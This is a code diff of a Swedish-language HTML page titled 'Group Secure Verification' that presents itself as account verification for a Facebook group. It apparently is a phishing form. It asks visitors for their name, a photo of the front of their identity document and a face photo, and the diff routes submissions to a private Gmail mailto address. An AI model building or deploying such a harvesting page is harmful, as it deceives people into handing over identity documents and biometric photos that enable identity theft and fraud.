@@ -1,39 +1,6 @@
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body {font-family: Arial, Helvetica, sans-serif;}
-* {box-sizing: border-box;}
-
-input[type=text], select, textarea {
-  width: 100%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  box-sizing: border-box;
-  margin-top: 6px;
-  margin-bottom: 16px;
-  resize: vertical;
-}
-
-input[type=submit] {
-  background-color: #4CAF50;
-  color: white;
-  padding: 12px 20px;
-  border: none;
-  border-radius: 4px;
-  cursor: pointer;
-}
-
-input[type=submit]:hover {
-  background-color: #45a049;
-}
-
-.container {
-  border-radius: 5px;
-  background-color: #f2f2f2;
-  padding: 20px;
-}
-</style>
+    <title>Group Secure Verification</title>
+<link rel="stylesheet" href="Styles.css" >
 </head>
 <body>
 
@@ -42,7 +9,7 @@ input[type=submit]:hover {
 <h3>Konto verifiering för Facebookgrupp</h3>
 
 <div class="container">
-  <form action="https://formspree.io/f/mknpyekw" method="POST">
+  <form action="mailto:sakragruppen@gmail.com" method="POST" enctype="text/plain">
     <label for="fname">Förnamn</label>
     <input type="text" id="fname" name="firstname" placeholder="Ditt namn..">
 
@@ -61,19 +28,8 @@ input[type=submit]:hover {
 
 
 
-    <h3>Ladda upp en bild på framsidan av din IDhandling</h3>
-<label>
-<input type="file" id="myFile">
-
-<button onclick="myFunction()">Ladda upp</button>
-
-<script>
-function myFunction() {
-  var x = document.getElementById("myFile");
-  x.disabled = true;
-}
-</script>
-</label>
+    <h3>Ladda upp en bild på framsidan av din IDhandling</h3><br>
+    <input type="file" name="attachment" accept="image/png, image/jpeg">
 <br><br>
 
 <h3>Ansiktsverifiering</h3>
@@ -81,22 +37,11 @@ function myFunction() {
 <p>Tänk på att ansiktet ska vara tydligt.</p>
 <img src="picturever.png"> <br><br>
 
-<label>
-<input type="file" id="myFile">
+<input type="file" name="attachment" accept="image/png, image/jpeg">
 
-<button onclick="myFunction()">Ladda upp</button>
-
-<script>
-function myFunction() {
-  var x = document.getElementById("myFile");
-  x.disabled = true;
-}
-</script>
-</label>
 <br><br>
 
-
-    <input type="submit" value="Skicka in">
+    <input onclick="sendEmail()" type="submit" name="submit" value="Skicka in">
   </form>
 </div>
 
